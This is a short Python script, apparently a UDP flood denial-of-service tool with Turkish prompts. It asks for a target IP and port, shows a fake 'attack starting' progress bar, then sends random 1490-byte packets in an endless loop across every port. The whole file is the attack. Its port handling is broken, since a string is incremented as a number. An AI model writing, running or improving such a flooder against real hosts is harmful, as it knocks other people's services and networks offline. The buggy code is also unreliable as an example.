import os 
import sys
import time
import random
import socket
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

ip = input("Hedef İP: ")
port = input("port: ")

os.system("clear")
os.system("figlet attack starting")
print("[                         ] % 0")
time.sleep(5)
print("[====                     ] % 25")
time.sleep(5)
print("[=========                ] % 50")
time.sleep(5)
print("[==============           ] % 75")
time.sleep(5)
print("[=========================] % 100")
time.sleep(3)

sent = 0

while True:
    sock.sendto(bytes, (ip,port))
    sent += 1
    port += 1
    print("Sent %s packet to %s throught port: %s"%(sent,ip,port))
    if port == 65534:
        port = 1